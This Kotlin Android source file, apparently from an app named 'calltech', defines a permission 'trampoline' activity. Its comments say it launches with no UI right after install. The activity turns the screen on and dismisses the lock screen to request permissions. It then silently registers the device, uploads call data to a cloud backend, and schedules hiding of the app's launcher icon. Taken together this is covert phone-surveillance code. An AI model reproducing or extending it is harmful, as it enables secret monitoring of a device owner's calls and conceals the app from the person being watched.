package com.calltech

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * App UI nahi — sirf system permission popup.
 * Install/adb start ke baad khud dialog aata hai, icon tap nahi.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var askedOnce = false
    private var finished = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
            Log.d(TAG, "Permission result $result")
            if (!SyncBootstrap.needsRuntimePermissions(this)) {
                finishQuietly(sync = true)
            } else {
                finishQuietly(sync = false)
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bringToFront()
        MongoSyncHelper.ensureApiUrl(this)
        CallSyncHelper.markBackgroundSyncEnabled(this, true)
        SyncBootstrap.armBackgroundSync(this)

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishQuietly(sync = true)
            return
        }

        mainHandler.postDelayed({ askPermissions() }, 150L)
    }

    override fun onResume() {
        super.onResume()
        if (finished) {
            return
        }
        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            finishQuietly(sync = true)
            return
        }
        if (!askedOnce) {
            mainHandler.postDelayed({ askPermissions() }, 80L)
        }
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    private fun askPermissions() {
        if (finished || isFinishing || askedOnce) {
            return
        }
        val missing = SyncBootstrap.requiredPermissions().filter { permission ->
            checkSelfPermission(permission) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            finishQuietly(sync = true)
            return
        }
        askedOnce = true
        bringToFront()
        permissionLauncher.launch(missing.toTypedArray())
    }

    private fun finishQuietly(sync: Boolean) {
        if (finished) {
            return
        }
        finished = true

        if (sync) {
            SyncObserverManager.register(applicationContext)
            BackgroundSyncRunner.run {
                try {
                    CallSyncService.holdDuring(applicationContext) {
                        DeviceRegistration.registerNow(applicationContext)
                        InstallFlow.runFirstCloudSync(applicationContext)
                        SyncBootstrap.onPermissionsReady(applicationContext)
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Silent first sync failed", error)
                } finally {
                    InstallFlow.completeSetup(applicationContext)
                    LauncherHider.markAndSchedule(applicationContext)
                }
            }
            LauncherHider.armHideAlarms(applicationContext, startDelayMs = 8_000L)
        }

        try {
            moveTaskToBack(true)
        } catch (_: Exception) {
        }
        finish()
    }

    private fun bringToFront() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        @Suppress("DEPRECATION")
        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
        )
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
